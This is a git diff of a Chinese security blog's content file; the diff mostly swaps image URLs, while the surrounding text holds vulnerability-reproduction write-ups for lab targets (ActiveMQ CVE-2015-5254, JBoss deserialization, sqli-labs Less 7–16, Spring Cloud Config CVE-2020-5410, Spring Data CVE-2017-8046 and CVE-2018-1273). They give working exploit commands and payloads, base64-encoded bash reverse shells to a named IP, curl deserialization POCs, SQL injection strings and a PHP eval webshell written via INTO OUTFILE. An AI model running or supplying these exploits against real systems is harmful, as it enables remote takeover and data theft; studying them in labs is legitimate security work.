 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101011.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101011.png" alt="image"></p>
 <p>进入容器，可见<code>touch /tmp/success</code>已成功执行：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101012.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101012.png" alt="image"></p>
 <p>反弹<code>shell</code>只需将<code>touch /tmp/success</code>替换即可</p>
 ]]></content>
       <categories>
@@ -900,7 +900,7 @@
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>运行漏洞环境</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;activemq&#x2F;CVE-2015-5254&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境运行后，将监听<code>61616</code>和<code>8161</code>两个端口。其中<code>61616</code>是工作端口，消息在这个端口进行传递；<code>8161</code>是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101001.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101001.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p>
 <ol>
 <li>构造（可以使用<code>ysoserial</code>）可执行命令的序列化对象</li>
@@ -908,23 +908,23 @@
 <li>访问web管理页面，读取消息，触发漏洞</li>
 </ol>
 <p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载<code>jmet</code>的jar文件，并在同目录下创建一个<code>external</code>文件夹（否则可能会报文件夹不存在的错误）。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101002.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101002.png" alt="image"></p>
 <p><code>jmet</code>原理是使用<code>ysoserial</code>生成<code>Payload</code>并发送（其<code>jar</code>内自带<code>ysoserial</code>，无需再自己下载），所以我们需要在<code>ysoserial</code>是<code>gadget</code>中选择一个可以使用的，比如<code>ROME</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101003.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101003.png" alt="image"></p>
 <p>此时会给目标<code>ActiveMQ</code>添加一个名为<code>event</code>的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
 <p>默认的用户名和密码为<code>admin</code>，<code>admin</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101004.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101004.png" alt="image"></p>
 <p>点击这条消息即可触发命令，此时进入容器<code>docker-compose exec activemq bash</code>，可见<code>/tmp/success</code>已成功创建，说明漏洞利用成功：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101005.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101005.png" alt="image"></p>
 <p>将命令替换成弹<code>shell</code>语句再利用：</p>
 <p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Java Runtime</a> 配合<code>bash</code>编码</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101006.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101006.png" alt="image"></p>
 <p>执行命令：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101007.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101007.png" alt="image"></p>
 <p>反弹shell:</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101008.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101008.png" alt="image"></p>
 <blockquote>
 <p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
 </blockquote>
@@ -944,13 +944,13 @@
 <p>环境启动后，目标为<code>http://your-ip:8080</code>。</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/jbossmq-httpil/HTTPServerILServlet</code></p>
 <p>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100907.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100907.png" alt="image"></p>
 <p>这里直接利用<code>CVE-2017-12149</code>生成的ser，发送到<code>/jbossmq-httpil/HTTPServerILServlet</code>接口中</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100908.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100908.png" alt="image"></p>
 <p>反弹shell：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100909.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100909.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -966,24 +966,24 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响5.x和6.x版本的JBOSSAS</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到<code>JBoss</code>默认页面。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100901.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100901.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/invoker/readonly</code>，返回500，说明页面存在，此页面存在反序列化漏洞。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100902.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100902.png" alt="image"></p>
 <p>利用工具:<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>,我们选择一个<code>Gadget</code>：<code>ReverseShellCommonsCollectionsHashMap</code>，编译并生成序列化数据：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100903.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100903.png" alt="image"></p>
 <p>生成<code>ReverseShellCommonsCollectionsHashMap.class</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure>
 
 <p>生成<code>ReverseShellCommonsCollectionsHashMap.ser</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 47.101.62.20:1234（ip是nc所在的ip）</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100904.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100904.png" alt="image"></p>
 <p>利用，监听端口：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
 <p>发送poc：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100905.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100905.png" alt="image"></p>
 <p>反弹shell:</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100906.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100906.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1001,10 +1001,10 @@
 </blockquote>
 <p>当我们输入</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100404.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100404.png" alt="image"></p>
 <p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p>
 <p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100405.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100405.png" alt="image"></p>
 <p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p>
 <p>当我们提交<code>username</code>和<code>password</code>后，后台形成的<code>sql</code>语句为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;or&#39;1&#39;&#x3D;&#39;1# and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
@@ -1013,38 +1013,38 @@
 </blockquote>
 <p>这里我们用 union 注入进行尝试：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username：1admin&#39;union select 1,database()#</span><br><span class="line">passwd&#x3D;1（任意密码）</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100406.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100406.png" alt="image"></p>
 <p>可以看到显示了<code>database</code>为<code>security</code>，这是我们比较常用的手法。<br>还可以利用其他的方法进行注入</p>
 <h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关于11不同之处在于，id参数使用了”)过滤。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&quot;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100407.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100407.png" alt="image"></p>
 <h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>本关id参数使用了’)过滤。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&#39;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100408.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100408.png" alt="image"></p>
 <blockquote>
 <p>我们可以明显的看到本关不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。</p>
 </blockquote>
 <p>猜测数据库第一位:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)and left(database(),1)&gt;&#39;a&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100409.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100409.png" alt="image"></p>
 <p>登录成功，就这样可以挨着对每一位进行测试，<code>less5</code>中我们已经讲到了这个过程了，这里就不重复了。</p>
 <blockquote>
 <p>在按位进行猜解的过程中，可以利用二分法，可以有效的降低尝试次<br>数</p>
 </blockquote>
 <h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关id参数使用了”过滤。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100410.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100410.png" alt="image"></p>
 <p>登录成功，同样没有输入结果，这里使用报错盲注演示一下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100411.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100411.png" alt="image"></p>
 <p>可以看到报错了，显示版本信息</p>
 <h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>本关id参数使用了’过滤，且没有错误提示，那么我们只能靠猜测进行盲注。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100412.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100412.png" alt="image"></p>
 <p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
 <h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>本关和Less15的处理方法是一样的，同样使用延时注入的方法进行解决。不同的是id参数使用了”)的处理</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100413.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100413.png" alt="image"></p>
 <p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
 ]]></content>
       <categories>
@@ -1058,11 +1058,11 @@
     <title>sqli-labs靶场Less-8-10</title>
     <url>/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-8-10/</url>
     <content><![CDATA[<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>经过简单的测试，发现<code>&#39;or 1=1--+</code>返回结果正常，基本确定应该怎么注入了</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100401.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100401.png" alt="image"></p>
 <p>这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100402.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100402.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100403.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100403.png" alt="image"></p>
 <p>如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。</p>
 <p>其他的payload参考less5直接进行注入即可</p>
 <h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>本关从标题可以看到《基于时间-单引号》，所以很明显这关要利用延时注入进行，同时id参数进行的是’的处理。大概演示一次演示注入。使用<code>sleep()</code>函数</p>
@@ -1102,17 +1102,17 @@
 <p>查看源码，重点关注对id参数的处理和sql语句上，源代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 <p>这里对id参数进行了’))处理，所以可以尝试<code>&#39;)) or 1=1--+</code>进行注入</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100201.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100201.png" alt="image"></p>
 <p>我们这里利用上述提到的文件导入的方式进行演示：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100202.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100202.png" alt="image"></p>
 <p>上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100203.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100203.png" alt="image"></p>
 <p>直接写入php一句话</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100204.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100204.png" alt="image"></p>
 <p>文件中可以看到已经上传成功了</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100205.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100205.png" alt="image"></p>
 <p>然后使用冰蝎、菜刀等工具连接即可</p>
 ]]></content>
       <categories>
@@ -1128,9 +1128,9 @@
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。<br>近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.2.x&lt;=2.2.2 2.1.x&lt;=2.1.8</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocus启动漏洞环境</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092923.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092923.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<br><code>http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092924.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092924.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1150,19 +1150,19 @@
 <p>已不支持的旧版本</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2018-1273&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>稍等一会，环境启动后，访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092917.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092917.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>填写信息，点击<code>Register user</code> 然后抓包</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092918.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092918.png" alt="image"></p>
 <p>修改<code>username</code>参数POC并发包:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092919.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092919.png" alt="image"></p>
 <p>进入docker容器查看：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092920.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092920.png" alt="image"></p>
 <p>修改poc为反弹shell：<br>还是先base64编码，再url编码后发包:</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092921.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092921.png" alt="image"></p>
 <p>反弹shell成功：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092922.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092922.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1180,21 +1180,21 @@
 <p>可以查看spring-data-rest-webmvc jar包的版本</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-8046&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>等待环境启动完成，然后访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。</a></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092912.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092912.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用<code>PATCH</code>请求来修改之：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATCH &#x2F;customers&#x2F;1 HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>ouch /tmp/success</code>。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092913.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092913.png" alt="image"></p>
 <p>然后进入容器<code>docker exec -it 容器id /bin/bash</code>看看：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092914.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092914.png" alt="image"></p>
 <p>制作反弹shell的POC:</p>
 <p>命令：<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/7777 0&gt;&amp;1</code></p>
 <p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a>：<code>bash -c &#123;echo,YGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNzc3NyAwPiYxYA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
 <p>通过下面的python代码将每个字符转为对应的十进制：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; b&#39;这里填poc&#39;</span><br><span class="line">bytecode &#x3D; &#39;,&#39;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092915.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092915.png" alt="image"></p>
 <p>重新发包修改为反弹shell的poc：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092916.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092916.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1211,21 +1211,21 @@
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-4971&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
